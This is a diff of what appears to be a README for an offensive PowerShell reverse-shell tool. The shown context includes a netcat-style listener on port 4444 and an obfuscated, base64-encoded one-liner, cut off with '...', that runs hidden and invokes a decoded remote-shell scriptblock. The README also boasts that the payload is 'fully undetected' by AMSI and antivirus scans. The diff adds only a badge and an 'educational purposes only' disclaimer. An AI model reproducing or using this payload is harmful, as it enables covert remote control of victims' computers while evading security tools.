@@ -65,7 +65,19 @@ listening on [any] 4444 ...
 powershell /w 1 /C "$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsAaQBm'+'ACAAKAAkADMAYwBhADQAYgBhADUANgA2AGMAZgBlAGQANQBjADEAYwA1ADMAMQBmAGQAMgA1ADkAYgBjAGYAMAA5ADcAOAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJAAzAGMAYQA0AGIAYQA1ADYANgBjAGYAZQBk'+'ADUAYwAx'+'...')));Invoke-Command -ScriptBlock $a"
 ```
 
-<a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Results</a>
+<a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Result</a>
 
 [![](https://user-images.githubusercontent.com/73026669/150165109-71b9f841-3b8e-42bd-a502-5d666244eaaf.png)](https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1)
+
+
+
+[![Build Status](https://user-images.githubusercontent.com/73026669/110617122-9c75ad00-8195-11eb-9ba5-422356072776.png)](https://github.com/LukeProducts)
+
+
+###
+DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY! 
+NO LIABILITY FOR ILLEGAL USE IS ASSUMED!
+FEEL FREE TO TEST THIS ON YOUR OWN LAB ENVIRONMENT!
+###
+© Copyright by LukeProducts
 
